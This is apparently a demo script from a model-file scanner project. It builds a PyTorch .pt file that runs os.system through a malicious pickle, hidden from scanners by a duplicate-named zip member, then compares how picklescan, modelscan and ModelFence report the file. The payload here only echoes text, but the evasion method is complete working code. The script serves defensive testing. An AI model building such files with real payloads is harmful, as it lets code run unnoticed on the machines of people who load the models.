#!/usr/bin/env python3
"""Reproduce the scanner-evasion head-to-head.

Builds a 409-byte .pt that executes `os.system` via a duplicate-member zip
differential (payload first, benign pickle second), then scans it with
ModelFence. If you have picklescan / modelscan installed, it runs them too so
you can see them report the file clean.

    python3 examples/evasion_demo.py
"""
import os
import pickle
import shutil
import subprocess
import sys
import tempfile
import zipfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from modelfence.cli import main as modelfence_main


class Evil:
    def __reduce__(self):
        return (os.system, ("echo 'payload executed'",))


def build(path: str) -> None:
    with zipfile.ZipFile(path, "w") as z:
        z.writestr("archive/data.pkl", pickle.dumps(Evil(), protocol=2))   # torch reads this
        z.writestr("archive/data.pkl", pickle.dumps({"w": [1]}, protocol=2))  # scanners read this
        z.writestr("archive/version", "3\n")


def main() -> None:
    d = tempfile.mkdtemp()
    model = os.path.join(d, "model.pt")
    build(model)
    print(f"built {model} ({os.path.getsize(model)} bytes) — "
          f"runs os.system via torch.load(weights_only=False)\n")

    for tool in ("picklescan", "modelscan"):
        exe = shutil.which(tool)
        if not exe:
            print(f"[{tool}] not installed — skipping")
            continue
        flag = "-p" if tool == "picklescan" else "-p"
        r = subprocess.run([exe, flag, model], capture_output=True, text=True)
        verdict = r.stdout.strip().splitlines()[-1] if r.stdout.strip() else "(no output)"
        print(f"[{tool}] exit={r.returncode}  {verdict}")

    print("\n[modelfence]")
    code = modelfence_main(["scan", model, "--no-color"])
    print(f"modelfence exit={code}")


if __name__ == "__main__":
    main()
